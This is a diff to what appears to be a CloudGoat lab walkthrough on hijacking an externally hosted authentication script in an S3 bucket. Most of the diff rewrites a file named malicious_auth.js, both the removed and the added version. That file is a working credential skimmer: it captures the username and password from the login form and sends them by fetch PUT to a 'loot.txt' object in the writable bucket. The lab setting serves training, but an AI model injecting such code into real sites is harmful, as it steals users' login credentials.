@@ -21,7 +21,7 @@ After deploying the scenario, CloudGoat outputs the IP address of the target web
 You should notice that the application loads its authentication logic from an external source rather than the local server:
 
 ```
-<script src="https://cg-assets-[ID][.s3.amazonaws.com/auth-module.js](https://.s3.amazonaws.com/auth-module.js)"></script>
+<script src="https://cg-assets-[ID][.s3.amazonaws.com/auth-module.js]"></script>
 
 ```
 
@@ -49,35 +49,34 @@ The goal is to capture the credentials entered into the login form. Since the `a
 Create a file named `malicious_auth.js` on your local machine with the following code:
 
 ```
-console.log("Exploit Loaded");
-
-document.addEventListener('DOMContentLoaded', function() {
+// Wait for the page to fully load
+window.addEventListener('load', function() {
+    
+    // Find the login button
     var btn = document.getElementById('login-btn');
-
-    if (btn) {
-        btn.addEventListener('click', function(e) {
-            // 1. Silent Steal: Don't alert the user
-            e.preventDefault();
-
-            var user = document.getElementById('username').value;
-            var pass = document.getElementById('password').value;
-
-            // 2. Dynamic Bucket Discovery
-            // (We parse the bucket name from the script tag itself)
-            var bucketId = document.querySelector('script[src*="auth-module.js"]').src.split('/')[2].split('.')[0];
-            var lootUrl = 'https://' + bucketId + '[.s3.amazonaws.com/loot.txt](https://.s3.amazonaws.com/loot.txt)';
-
-            var data = "CAPTURED CREDENTIALS:\nUser: " + user + "\nPass: " + pass;
-
-            // 3. Exfiltrate to S3
-            // Since the bucket is writable, we can just PUT the data there!
-            fetch(lootUrl, {
-                method: 'PUT',
-                body: data,
-                keepalive: true
-            }).then(() => console.log("Credentials exfiltrated to " + lootUrl));
-        });
-    }
+    
+    // Add a click listener to the button
+    btn.addEventListener('click', function() {
+        
+        // 1. Steal the values from the input fields
+        var user = document.getElementById('username').value;
+        var pass = document.getElementById('password').value;
+        var lootData = "CAPTURED CREDENTIALS:\nUsername: " + user + "\nPassword: " + pass;
+        
+        // 2. Dynamically find the bucket URL from the existing script tag
+        // (This saves you from hardcoding the ID)
+        var bucketId = document.querySelector('script[src*="auth-module.js"]').src.split('/')[2].split('.')[0];
+        var lootUrl = 'https://' + bucketId + '.s3.amazonaws.com/loot.txt';
+        
+        // 3. Exfiltrate the data to S3
+        // We use 'keepalive: true' to ensure the request finishes even if the page navigates away
+        fetch(lootUrl, {
+            method: 'PUT',
+            body: lootData,
+            keepalive: true
+        }).then(res => console.log('Loot sent to ' + lootUrl));
+        
+    });
 });
 
 ```
@@ -120,7 +119,7 @@ You should see the captured output:
 ```
 CAPTURED CREDENTIALS:
 User: tyler
-Pass: H@cKallth3th!ngs!3
+Pass: [REDACTED]
 
 ```
 
